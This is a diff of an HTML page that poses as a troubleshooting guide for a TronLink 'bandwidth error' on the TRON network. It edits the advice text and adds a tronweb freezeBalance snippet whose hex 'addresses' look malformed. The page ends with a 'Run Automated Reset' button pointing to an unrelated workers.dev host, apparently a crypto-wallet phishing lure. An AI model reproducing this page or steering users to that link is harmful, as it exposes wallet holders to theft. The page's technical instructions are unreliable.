@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tronlink Bandwidth Error</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #1a1a24;
+        font-family: system-ui;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -41,36 +41,33 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON network, resulting in failed or pending transactions.</li>
+<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON ecosystem, resulting in failed or stalled operations.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth or energy on the user's TRON account, which is required to process transactions and execute smart contracts on the network.</li>
+<li>The error occurs due to insufficient bandwidth or energy on the user's TRON account, which is required to execute transactions and interact with smart contracts on the network.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the account's bandwidth by freezing TRX tokens for a specified period.</li>
-<li>Verify that the transaction parameters, such as fee limit and bandwidth limit, are set correctly.</li>
-<li>Use the following JSON-RPC command to check the account's bandwidth:</li>
+<li>Increase the account's bandwidth by freezing TRX tokens, which can be done through the TronLink wallet interface or using the following commands:</li>
+<li>Freeze 10000 TRX to obtain a significant amount of bandwidth</li>
+<li>Unfreeze TRX after a certain period to regain control over the tokens</li>
+<li>Monitor bandwidth and energy levels regularly to avoid depletion</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;tron_getAccount&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user_tron_address&quot;</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">  </span><span class="p">],</span>
-<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>tronweb.transactionBuilder.freezeBalance<span class="o">(</span>
+<span class="w">  </span><span class="s2">&quot;10000&quot;</span>,
+<span class="w">  </span><span class="m">3</span>,
+<span class="w">  </span><span class="s2">&quot;0x42567b352532a56b6524352365&quot;</span>,
+<span class="w">  </span><span class="s2">&quot;0x42567b352532a56b6524352365&quot;</span>
+<span class="o">)</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced debugging capabilities.</p>
+<p>Consider utilizing an external console for more complex operations. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A TRON account with a positive balance.</li>
-<li>The TronLink wallet extension installed and configured.</li>
-<li>A basic understanding of TRON's resource management system.</li>
+<li>A TRON-based wallet (e.g., TronLink) installed and configured</li>
+<li>A basic understanding of TRON's bandwidth and energy mechanisms</li>
+<li>Sufficient TRX tokens to freeze for bandwidth allocation</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
